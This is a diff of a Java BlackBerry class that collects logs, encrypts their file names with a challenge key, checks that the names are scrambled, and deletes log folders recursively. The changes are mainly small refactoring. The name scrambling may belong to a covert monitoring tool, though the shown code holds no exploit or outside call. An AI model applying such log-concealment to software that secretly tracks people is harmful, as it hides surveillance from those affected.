@@ -59,6 +59,8 @@ public final class LogCollector implements Singleton {
     // di
     // accesso
 
+    int seed;
+    
     /**
      * Decrypt name.
      * 
@@ -113,12 +115,13 @@ public final class LogCollector implements Singleton {
     /**
      * Instantiates a new log collector.
      */
-    protected LogCollector() {
+    private LogCollector() {
         super();
         logVector = new Vector();
 
         logProgressive = deserializeProgressive();
         keys = Keys.getInstance();
+        seed = keys.getChallengeKey()[0];
     }
 
     private void clear() {
@@ -131,7 +134,7 @@ public final class LogCollector implements Singleton {
         debug.info("Removing Progressive");
         PersistentStore.destroyPersistentObject(PERSISTENCE_KEY);
     }
-    
+
     private synchronized int deserializeProgressive() {
         logProgressivePersistent = PersistentStore
                 .getPersistentObject(PERSISTENCE_KEY);
@@ -252,11 +255,12 @@ public final class LogCollector implements Singleton {
         final String fileName = progressive + "!" + makeDateName(timestamp);
 
         final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
-                keys.getChallengeKey()[0]);
+                seed);
 
         //#ifdef DBC
-        Check.asserts(!encName.endsWith("MOB"), "makeNewName: not scrambled. "
-                + this);
+        Check.asserts(!encName.endsWith("MOB"), "makeNewName: " + encName
+                + " ch: " + seed 
+                + " not scrambled: " + fileName + LOG_EXTENSION);
         //#endif
 
         vector.addElement(new Integer(progressive));
@@ -306,8 +310,7 @@ public final class LogCollector implements Singleton {
             fc = (FileConnection) Connector.open(basePath);
 
             if (fc.isDirectory()) {
-                final Enumeration fileLogs = fc.list("*",
-                        true);
+                final Enumeration fileLogs = fc.list("*", true);
 
                 while (fileLogs.hasMoreElements()) {
                     final String file = (String) fileLogs.nextElement();
@@ -317,11 +320,11 @@ public final class LogCollector implements Singleton {
                     removeLogRecursive(basePath + file, true);
                 }
             }
-            
-            if(delete){
+
+            if (delete) {
                 fc.delete();
             }
-            
+
             fc.close();
 
         } catch (final IOException e) {
